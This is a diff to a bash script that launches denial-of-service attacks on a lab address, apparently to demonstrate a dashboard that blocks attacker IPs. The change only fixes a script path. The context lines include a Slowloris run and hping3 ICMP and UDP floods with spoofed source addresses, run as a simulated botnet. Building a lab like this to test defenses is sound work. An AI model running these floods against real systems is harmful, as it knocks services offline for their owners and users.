@@ -12,6 +12,7 @@
 # ==============================================================================
 
 TARGET_IP="10.0.0.3"
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
 print_header() {
     clear
@@ -59,7 +60,7 @@ case_launch() {
             ;;
         3)
             echo "[!] Launching Slowloris Low-and-Slow Attack against $TARGET_IP:80..."
-            python3 network/slowloris.py $TARGET_IP 80 150
+            python3 "$SCRIPT_DIR/slowloris.py" $TARGET_IP 80 150
             ;;
         4)
             echo "[!] Launching ICMP Ping Flood against $TARGET_IP..."
@@ -90,7 +91,7 @@ case_launch() {
             sudo hping3 -a 10.0.0.6 --flood --icmp $TARGET_IP >/dev/null 2>&1 &
             sudo hping3 -a 10.0.0.7 --flood --udp -p 8080 $TARGET_IP >/dev/null 2>&1 &
             sudo hping3 -a 10.0.0.8 --flood --udp -p 53 $TARGET_IP >/dev/null 2>&1 &
-            python3 network/slowloris.py $TARGET_IP 80 80 >/dev/null 2>&1 &
+            python3 "$SCRIPT_DIR/slowloris.py" $TARGET_IP 80 80 >/dev/null 2>&1 &
             
             echo "[+] Distributed Botnet active in background!"
             echo "Observe the React Dashboard to watch all 6 attacker IPs get blocked in real-time."
